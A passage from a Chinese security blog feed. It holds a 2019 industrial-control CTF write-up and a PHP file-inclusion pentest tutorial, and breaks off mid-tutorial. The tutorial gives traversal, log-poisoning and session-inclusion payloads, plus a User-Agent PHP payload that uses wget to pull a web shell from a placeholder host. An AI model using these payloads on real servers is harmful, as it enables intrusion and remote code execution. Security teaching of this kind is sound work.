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</span><br></pre></td></tr></table></figure><p>解密得到图片</p><p><img src="https://user-images.githubusercontent.com/38073810/62021805-b7332200-b1fb-11e9-8675-cee79a5bcb1a.png" alt="image"></p><h2 id="1-3-工业协议分析2"><a href="#1-3-工业协议分析2" class="headerlink" title="1.3.工业协议分析2"></a>1.3.工业协议分析2</h2><p>题目：在进行工业企业检查评估工作中，发现了疑似感染恶意软件的上位机。现已提取出上位机通信流量，尝试分析出异常点，获取FLAG。</p><p>附件下载：<a href="https://www.lanzous.com/b864351" target="_blank" rel="noopener">1.3.工业协议分析2</a></p><p>wireshark打开后直接审计出的，你会发现好多包里都有这串16进制的数。</p><p><img src="https://user-images.githubusercontent.com/38073810/62021816-c6b26b00-b1fb-11e9-9214-b9096b5e4a70.png" alt="image-20190729110250337"></p><p>copy，我们去<a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">转换字符</a>，得到flag{7FoM2StkhePz}，提交格式：7FoM2StkhePz</p><h2 id="1-4-组态软件安全分析"><a href="#1-4-组态软件安全分析" class="headerlink" title="1.4.组态软件安全分析"></a>1.4.组态软件安全分析</h2><p>题目：一些组态软件中进行会配置连接很多PLC设备信息。我们在SCADA 工程中写入了flag字段，请获取该工程flag</p><p>附件下载：<a href="https://www.lanzous.com/b864352" target="_blank" rel="noopener">1.4.组态软件安全分析</a></p><p>首先下载附件得到test.PCZ文件，直接文本打开发现是以PK开头的文件</p><p><img src="https://user-images.githubusercontent.com/38073810/62021818-d29e2d00-b1fb-11e9-9784-1c48124859b6.png" alt="image-20190729111216252"></p><p>修改后缀为zip，打开发现一个文件夹，一个xml(加密，暂时不管)，然后把文件夹拖到mac里直接使用命令搜索flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> cat &#123;&#125; \; |grep -a <span class="string">"flag"</span></span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/38073810/62021826-e184df80-b1fb-11e9-8343-107eedc90749.png" alt="image-20190729111729563"></p><p>得到flag{D076-4D7E-92AC-A05ACB788292}，提交格式：D076-4D7E-92AC-A05ACB788292</p><h2 id="1-5-工控蜜罐日志分析"><a href="#1-5-工控蜜罐日志分析" class="headerlink" title="1.5.工控蜜罐日志分析"></a>1.5.工控蜜罐日志分析</h2><p>题目：工控安全分析人员在互联网上部署了工控仿真蜜罐，通过蜜罐可抓取并分析互联网上针对工业资产的扫描行为，将存在高危扫描行为的IP加入防火墙黑名单可有效减少工业企业对于互联网的攻击面。分析出日志中针对西门子私有通信协议扫描最多的IP，分析该扫描组织。FLAG为该IP的域名。</p><p>附件下载：<a href="https://www.lanzous.com/b864354" target="_blank" rel="noopener">1.5.工控蜜罐日志分析</a></p><p>解压附件到本地，得到honeypot.log。直接提取ip，去重。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat honeypot.log | grep -o <span class="string">'\([0-9]\&#123;1,3\&#125;\.\)\&#123;3\&#125;[0-9]\&#123;1,3\&#125;'</span>|sort -d | uniq  &gt;&gt; IPFile2.txt</span><br></pre></td></tr></table></figure><p>然后nslookup反查域名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">flie = open(<span class="string">'IPFile2.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">ip = list()</span><br><span class="line"></span><br><span class="line">count = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">600</span>)]</span><br><span class="line"></span><br><span class="line">ip.append(flie.readline())</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    line = flie.readline()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(ip)):</span><br><span class="line">        <span class="keyword">if</span> ip[i] == line:</span><br><span class="line">            count[i] += <span class="number">1</span></span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        ip.append(line)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(count)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(count)<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">if</span> count[j] &lt; count[j+<span class="number">1</span>]:</span><br><span class="line">            temp = count[j+<span class="number">1</span>]</span><br><span class="line">            count[j+<span class="number">1</span>] = count[j]</span><br><span class="line">            count[j] = temp</span><br><span class="line">            temp2 = ip[j+<span class="number">1</span>]</span><br><span class="line">            ip[j+<span class="number">1</span>] = ip[j]</span><br><span class="line">            ip[j] = temp2</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line">    os.system(<span class="string">'nslookup %s'</span>%ip[i])</span><br></pre></td></tr></table></figure><p>得到结果，最后测试时，成功提交flag，提交格式：scan-42.security.ipip.net</p><p><img src="https://user-images.githubusercontent.com/38073810/62021851-024d3500-b1fc-11e9-91af-922e1ff861c3.png" alt="image-20190729112507523"></p><p>没仔细审题，后来发现是对西门子私有通信协议扫描最多的，应该直接提取扫描最多的ip，这样最终就容易判断flag了。</p><h2 id="1-6-隐信道数据安全分析-未解决"><a href="#1-6-隐信道数据安全分析-未解决" class="headerlink" title="1.6.隐信道数据安全分析 [未解决]"></a>1.6.隐信道数据安全分析 [未解决]</h2><p>题目：安全分析人员截获间谍发出的秘密邮件，该邮件只有一个mp3文件，安全人员怀疑间谍通过某种private的方式将信息传递出去，尝试分析该文件，获取藏在文件中的数据？</p><p>附件下载：<a href="https://www.lanzous.com/b864355" target="_blank" rel="noopener">1.6.隐信道数据安全分析</a></p><h2 id="1-7-工业网络设备逆向-未解决"><a href="#1-7-工业网络设备逆向-未解决" class="headerlink" title="1.7.工业网络设备逆向 [未解决]"></a>1.7.工业网络设备逆向 [未解决]</h2><p>题目：这是一个工业系统中使用的路由器，系统的tddp协议存在远程代码执行漏洞。 请找出并分析tddp协议的执行过程，并回答以下问题 1.远程执行命令的消息类型为？（格式为CMD_???_???） 2.在tddp协议中第几个字节 = 什么时，可以控制发出远程执行命令的消息（FLAG格式为16进制）</p><p>附件下载：<a href="https://www.lanzous.com/b864356" target="_blank" rel="noopener">1.7.工业网络设备逆向</a></p><p>公告提示：</p><p><img src="https://user-images.githubusercontent.com/38073810/62021864-15600500-b1fc-11e9-9d6f-8a973751013c.png" alt="image-20190729113128914"></p><h2 id="1-8-二次设备固件逆向"><a href="#1-8-二次设备固件逆向" class="headerlink" title="1.8.二次设备固件逆向"></a>1.8.二次设备固件逆向</h2><p>题目：在对电力行业某二次设备进行渗透测试时，通过弱口令telnet服务获取了设备的权限，并提取出了设备固件文件，现在需要从固件中分析出其他默认硬编码密码或厂家后门口令。</p><p>附件下载：<a href="https://www.lanzous.com/b864357" target="_blank" rel="noopener">1.8.二次设备固件逆向</a></p><p>直接放到mac里搜索strings “pass” 命令如下</p><p><img src="https://user-images.githubusercontent.com/38073810/62021891-3b85a500-b1fc-11e9-98d0-9decd3ad31c5.jpg" alt="A954434307940E23D65F02AA0E280511"></p><p>找到passWd后用ida打开找到</p><p><img src="https://user-images.githubusercontent.com/38073810/62021907-4b9d8480-b1fc-11e9-8997-940772781074.jpg" alt="0A170A2C2652160258A9E50F92B18F22"></p><p>得到弱口令：icspwd，flag提交格式：icspwd</p><p>这题是<a href="https://bufsnake.github.io/" target="_blank" rel="noopener">Snake</a>做的，上面几题也帮我不少(逃。</p><h2 id="1-9-组态工程逆向分析-未解决"><a href="#1-9-组态工程逆向分析-未解决" class="headerlink" title="1.9.组态工程逆向分析 [未解决]"></a>1.9.组态工程逆向分析 [未解决]</h2><p>题目：很多工业组态软件并未进行安全测试，存在很多安全隐患。请分析组态工程的文件，发现该工程的异常，并获取FLAG。</p><p>附件下载：<a href="https://www.lanzous.com/b864358" target="_blank" rel="noopener">1.9.组态工程逆向分析（未解决）</a></p><h2 id="1-10-工业数据库安全分析-未解决-，未做"><a href="#1-10-工业数据库安全分析-未解决-，未做" class="headerlink" title="1.10.工业数据库安全分析 [未解决 ，未做]"></a>1.10.工业数据库安全分析 [未解决 ，未做]</h2><p>题目：InSQL是世界上第一种面向工厂的高性能的实时关系型数据库。请分析数据库源文件，获取数据库中的异常，并找到FLAG。</p><p>附件下载：<a href="https://www.lanzous.com/b864359" target="_blank" rel="noopener">1.10.工业数据库安全分析（未解决）</a></p><h2 id="1-11-工业网络渗透测试-场景题，未做"><a href="#1-11-工业网络渗透测试-场景题，未做" class="headerlink" title="## 1.11.工业网络渗透测试 [场景题，未做]"></a>## 1.11.工业网络渗透测试 [场景题，未做]</h2><p>题目：通过VPN接入工业网络靶场场景中，探测发现工业管理网络中的Web应用，通过漏洞控制服务器权限，进而进一步针对工业网络进行渗透。远程VPN地址会通过系统消息发送，请留意。</p><p>公告消息：</p><p><img src="https://user-images.githubusercontent.com/38073810/62021914-59eba080-b1fc-11e9-9d25-8f2574ca5f17.png" alt="image-20190729121207317"></p><h2 id="1-12-SCADA系统渗透测试-场景题，未做"><a href="#1-12-SCADA系统渗透测试-场景题，未做" class="headerlink" title="1.12.SCADA系统渗透测试 [场景题，未做]"></a>1.12.SCADA系统渗透测试 [场景题，未做]</h2><p>题目：当你进入了企业管理网络，可以尝试进入生产管理网络，进而针对未进行安全防护的工业SCADA系统进行渗透测试。尝试发现SCADA系统并测试发现隐藏在系统服务中的Flag。需要通过VPN账号接入远程场景环境，并获取已经获取到访问生产管理网权限。</p><p>公告消息：</p><p><img src="https://user-images.githubusercontent.com/38073810/62021914-59eba080-b1fc-11e9-9d25-8f2574ca5f17.png" alt="image-20190729121207317"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019年工业信息安全技能大赛个人线上赛-第一场-writeup&quot;&gt;&lt;a href=&quot;#2019年工业信息安全技能大赛个人线上赛-第一场-writeup&quot; class=&quot;headerlink&quot; title=&quot;2019年工业信息安全技能大赛个人线上赛(第一场)wri
      
    
    </summary>
    
      <category term="ctf" scheme="https:///login546.github.io/categories/ctf/"/>
    
    
      <category term="ices" scheme="https:///login546.github.io/tags/ices/"/>
    
      <category term="2019年工业信息安全技能大赛个人线上赛(第一场)" scheme="https:///login546.github.io/tags/2019%E5%B9%B4%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E7%BA%BF%E4%B8%8A%E8%B5%9B-%E7%AC%AC%E4%B8%80%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试《文件包含》漏洞</title>
    <link href="https:///login546.github.io/2019/07/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E3%80%8B/"/>
    <id>https:///login546.github.io/2019/07/25/渗透测试《文件包含漏洞》/</id>
    <published>2019-07-25T19:50:28.000Z</published>
    <updated>2021-01-22T08:48:08.994Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件包含漏洞产生的原因是在通过php函数引入文件时，由于传入的文件名没有经过合理的校验，从而引发了文件的泄漏或者恶意代码的注入</p><p>php引发文件包含漏洞的四个常见函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>() 当使用该函数包含文件时，只有代码执行到<span class="keyword">include</span>()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</span><br><span class="line"><span class="keyword">include_once</span>() 功能和<span class="keyword">include</span>()相同，区别在于当重复调用同一文件时，程序只调用一次。</span><br><span class="line"><span class="keyword">require</span>() 只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</span><br><span class="line"><span class="keyword">require_once</span>() 它的功能与<span class="keyword">require</span>()相同，区别在于当重复调用同一文件时，程序只调用一次。</span><br></pre></td></tr></table></figure><p>使用这些函数时，php内核并不在意该被包含的文件是什么类型。所以如果被包含的是txt文件、图片文件、远程url、也都将作为PHP代码执行。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="keyword">include</span>等函数通过动态执行变量的方式引入需要包含的文件；</span><br><span class="line"><span class="number">2</span>、用户能控制该动态变量。</span><br></pre></td></tr></table></figure><h2 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、本地文件包含LFI(Local File <span class="keyword">Include</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、远程文件包含RFI(Remote File <span class="keyword">Include</span>)（需要php.ini中allow_url_include=on allow_url_fopen = On）</span><br><span class="line"></span><br><span class="line">在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5<span class="number">.2</span>之后就默认为Off。</span><br></pre></td></tr></table></figure><h3 id="一、本地包含"><a href="#一、本地包含" class="headerlink" title="一、本地包含"></a>一、本地包含</h3><h4 id="包含同目录下的文件"><a href="#包含同目录下的文件" class="headerlink" title="包含同目录下的文件"></a>包含同目录下的文件</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=test.txt</span><br></pre></td></tr></table></figure><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=./../../test.txt</span><br><span class="line">./ 当前目录   ../ 上一级目录</span><br></pre></td></tr></table></figure><h4 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</span><br><span class="line"></span><br><span class="line">很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</span><br><span class="line"></span><br><span class="line">构造url为：`http://xxxx/&lt;?php phpinfo();?&gt;`，请求</span><br><span class="line"></span><br><span class="line">之后包含日志文件 `include(‘/var/log/apache2/access.log’)`，</span><br><span class="line"></span><br><span class="line">从而成功执行php代码 `?file=../../../../../../../../../var/log/apache/error.log`</span><br></pre></td></tr></table></figure><h5 id="常用日志默认路径"><a href="#常用日志默认路径" class="headerlink" title="常用日志默认路径"></a>常用日志默认路径</h5><h6 id="apache-Linux日志默认路径"><a href="#apache-Linux日志默认路径" class="headerlink" title="apache+Linux日志默认路径"></a>apache+Linux日志默认路径</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/httpd/logs/access_log  </span><br><span class="line">/var/log/httpd/access log</span><br></pre></td></tr></table></figure><h6 id="nginx日志文件"><a href="#nginx日志文件" class="headerlink" title="nginx日志文件"></a>nginx日志文件</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nginx 日志文件在用户安装目录的logs目录下</span><br><span class="line">如安装目录为/usr/local/nginx,则日志目录就是在/usr/local/nginx/logs</span><br><span class="line">也可通过其配置文件Nginx.conf，获取到日志的存在路径（/opt/nginx/logs/access.log）</span><br></pre></td></tr></table></figure><h4 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">利用条件：session文件路径已知，且其中内容部分可控。</span><br><span class="line"></span><br><span class="line">PHP默认生成的Session文件往往存放在/tmp目录下</span><br><span class="line">/tmp/sess_SESSIONID</span><br><span class="line"></span><br><span class="line">/var/lib/php/session/sess_SESSIONID</span><br><span class="line"></span><br><span class="line">?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</span><br><span class="line"></span><br><span class="line">（session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell）</span><br></pre></td></tr></table></figure><h4 id="包含-proc-self-environ文件"><a href="#包含-proc-self-environ文件" class="headerlink" title="包含/proc/self/environ文件"></a>包含/proc/self/environ文件</h4><p>利用条件：</p><ol><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ol><p>姿势：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</span><br></pre></td></tr></table></figure><p>?file=../../../../../../../proc/self/environ</p><p>选择User-Agent 写代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?system(&apos;wget http://www.yourweb.com/oneword.txt -O shell.php&apos;);?&gt;</span><br></pre></td></tr></table></figure><p>然后提交请求。</p><h4 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</span><br><span class="line"></span><br><span 